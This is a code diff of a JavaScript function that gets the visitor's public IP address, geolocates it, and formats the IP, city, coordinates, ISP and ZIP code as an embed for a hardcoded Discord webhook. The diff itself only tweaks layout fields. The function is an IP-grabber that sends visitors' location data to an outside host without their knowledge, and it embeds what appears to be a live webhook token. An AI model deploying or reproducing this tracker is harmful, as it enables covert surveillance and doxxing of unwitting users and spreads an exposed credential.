@@ -1,6 +1,5 @@
 function sendIPToWebhook() {
     const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
-    const ipstackAPIKey = 'YOUR_IPSTACK_API_KEY'; // Replace with your actual ipstack API key
 
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
@@ -11,44 +10,52 @@ function sendIPToWebhook() {
                 .then(geoData => {
                     const embedData = {
                         "title": "User's Geolocation Information",
-                        "description": "Here's the geolocation information of the user:",
                         "color": 16776960, // Yellow color (decimal representation)
                         "fields": [
                             {
                                 "name": "IP Address",
-                                "value": geoData.ip
+                                "value": geoData.ip,
+                                "inline": true
                             },
                             {
                                 "name": "Country",
-                                "value": geoData.country_name
+                                "value": geoData.country_name,
+                                "inline": true
                             },
                             {
                                 "name": "Region",
-                                "value": geoData.region
+                                "value": geoData.region,
+                                "inline": true
                             },
                             {
                                 "name": "City",
-                                "value": geoData.city
+                                "value": geoData.city,
+                                "inline": true
                             },
                             {
                                 "name": "Latitude",
-                                "value": geoData.latitude
+                                "value": geoData.latitude,
+                                "inline": true
                             },
                             {
                                 "name": "Longitude",
-                                "value": geoData.longitude
+                                "value": geoData.longitude,
+                                "inline": true
                             },
                             {
                                 "name": "ISP",
-                                "value": geoData.org
+                                "value": geoData.org,
+                                "inline": false
                             },
                             {
                                 "name": "Organization",
-                                "value": geoData.asn
+                                "value": geoData.asn,
+                                "inline": false
                             },
                             {
                                 "name": "ZIP Code",
-                                "value": geoData.postal
+                                "value": geoData.postal,
+                                "inline": true
                             }
                         ]
                     };
